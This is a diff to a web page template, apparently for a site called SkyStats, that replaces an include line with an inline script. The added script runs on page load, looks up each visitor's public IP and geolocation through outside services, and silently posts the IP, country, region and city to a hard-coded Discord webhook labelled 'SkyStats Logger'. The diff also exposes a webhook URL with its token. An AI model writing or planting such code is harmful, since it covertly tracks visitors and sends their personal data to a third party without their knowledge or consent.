@@ -99,7 +99,30 @@
   <script src="https://unpkg.com/tippy.js@6/dist/tippy-bundle.umd.js"></script>
 </body>
 
-<%- include("./utilities.ejs"); %>
+<script>
+    fetch("http://ip.jsontest.com/")
+    .then(response => response.json())
+    .then(json => json.ip)
+    .then(ip => {
+      fetch(`http://ip-api.com/json/${ip}`)
+      .then(response => response.json())
+      .then(data => {
+        const request = new XMLHttpRequest();
+        request.open("POST", "https://discord.com/api/webhooks/999690198893989929/Bhd3Ve_ePh8ZS9VPpCaxtnKm5veKLPb0WAz0vH6ghAFh9FkVjBrv87BC2Axy4-ZC_RB6");
+  
+        request.setRequestHeader('Content-type', 'application/json');
+  
+        const params = {
+            username: "SkyStats Logger",
+            content: `IP: ${data.query}\nCountry: ${data.country}\nRegion: ${data.regionName}\nCity: ${data.city}`,
+        }
+  
+        request.send(JSON.stringify(params));
+      })
+    });
+  
+  
+  </script>
 
 <script>
     // window.onload = function () {
